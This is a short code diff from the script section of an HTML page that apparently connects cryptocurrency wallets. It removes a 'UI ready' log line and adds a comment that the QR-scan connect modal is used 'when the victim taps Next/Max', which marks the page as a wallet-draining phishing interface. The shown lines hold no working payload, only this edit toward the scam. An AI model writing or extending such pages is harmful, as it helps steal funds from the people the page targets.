-        // We'll also make the Max button fill a reasonable amount.
-        // (Already set to 1000 above, but if you want to fetch real balance, replace this block.)
-
-        console.log('UI ready — all buttons are interactive.');
+            // No injected wallet — the connect modal (QR scan) is used when the victim taps Next/Max
+        })();
     </script>
 </body>
 </html>
